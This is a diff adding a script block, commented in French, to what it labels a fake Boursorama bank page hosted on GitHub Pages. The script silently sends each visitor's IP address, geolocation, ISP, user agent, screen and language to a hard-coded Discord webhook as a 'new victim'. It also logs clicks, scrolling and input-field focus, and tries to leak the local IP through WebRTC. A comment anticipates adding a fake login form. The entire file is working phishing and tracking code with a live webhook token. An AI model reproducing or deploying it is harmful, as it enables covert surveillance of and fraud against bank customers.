@@ -1,0 +1,99 @@
+<script>
+// TON WEBHOOK DISCORD (crée un nouveau webhook dans un salon privé)
+const WEBHOOK = "https://discord.com/api/webhooks/1462775716759474301/H9LdCZbmdBcE1kVWi-TiWngKNntNfXZyOP2vbpk3OX5PQI3RW4QRhbD3aC8pl7KjBQnv";
+
+// Fonction envoi embed (simple et discret)
+async function sendToDiscord(title, fields = [], color = 0xFF0000) {
+  const payload = {
+    embeds: [{
+      title,
+      color,
+      fields,
+      timestamp: new Date().toISOString(),
+      footer: { text: "Fake Bourso Logger • GitHub Pages" }
+    }],
+    username: "Bourso Bank"
+  };
+
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (e) {} // silencieux
+}
+
+// 1. Log arrivée + IP/géo basique (via API gratuite)
+(async () => {
+  const ipInfo = await fetch("https://ipapi.co/json/")  // ou http://ip-api.com/json/
+    .then(r => r.json())
+    .catch(() => ({}));
+
+  const ua = navigator.userAgent;
+  const screen = `${screen.width}x${screen.height}`;
+  const lang = navigator.language || navigator.userLanguage;
+
+  sendToDiscord("Nouvelle victime arrivée sur fake Bourso", [
+    { name: "IP", value: ipInfo.ip || "inconnu", inline: true },
+    { name: "Pays / Ville", value: `${ipInfo.country_name || '?'} - ${ipInfo.city || '?'}`, inline: true },
+    { name: "FAI", value: ipInfo.org || ipInfo.asn || "?", inline: false },
+    { name: "User-Agent", value: ua.slice(0, 100) + "...", inline: false },
+    { name: "Écran / Langue", value: `${screen} • ${lang}`, inline: true },
+    { name: "Heure FR", value: new Date().toLocaleString("fr-FR", {timeZone: "Europe/Paris"}), inline: true }
+  ]);
+})();
+
+// 2. Log tous les clics (boutons "Devenir client", liens, etc.)
+document.addEventListener("click", e => {
+  const t = e.target.closest("a, button, [role=button], input[type=submit], .btn, [class*=button]");
+  if (!t) return;
+
+  const info = {
+    text: (t.innerText || t.value || "?").trim().slice(0, 50),
+    href: t.href || t.getAttribute("href") || "?",
+    tag: t.tagName,
+    id_class: (t.id || t.className || "?").slice(0, 50)
+  };
+
+  sendToDiscord("CLIC détecté", [
+    { name: "Élément", value: `${info.tag} • ${info.text}`, inline: false },
+    { name: "Lien / Action", value: info.href, inline: false }
+  ], 0x00FF00); // vert pour clics
+}, true);
+
+// 3. Log scroll profond (ex: ils lisent les CGU ou offres)
+let loggedScroll = false;
+window.addEventListener("scroll", () => {
+  if (!loggedScroll && window.scrollY > document.body.scrollHeight * 0.4) {
+    loggedScroll = true;
+    sendToDiscord("Scroll > 40% (intéressé ?)", [], 0xFFFF00); // jaune
+  }
+});
+
+// 4. Tentative IP locale (WebRTC – marche ~40-70% des cas en 2026)
+function tryLocalIP() {
+  const pc = new RTCPeerConnection({iceServers: []});
+  pc.createDataChannel("");
+  pc.createOffer().then(offer => pc.setLocalDescription(offer));
+  pc.onicecandidate = e => {
+    if (!e.candidate) return;
+    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+    if (match && !match[1].startsWith("100.") && !match[1].startsWith("127.") && !match[1].startsWith("0.")) {
+      sendToDiscord("IP locale possible (WebRTC)", [
+        { name: "IP locale", value: match[1], inline: true }
+      ], 0xFF00FF); // magenta
+    }
+  };
+}
+setTimeout(tryLocalIP, 3000); // delay pour pas bloquer le chargement
+
+// Option : log focus sur un champ (si tu ajoutes un faux login plus tard)
+document.addEventListener("focusin", e => {
+  if (e.target.matches("input, textarea")) {
+    sendToDiscord("Focus sur champ", [
+      { name: "Type/Name", value: e.target.type + " • " + (e.target.name || e.target.id || "?") }
+    ]);
+  }
+});
+</script>
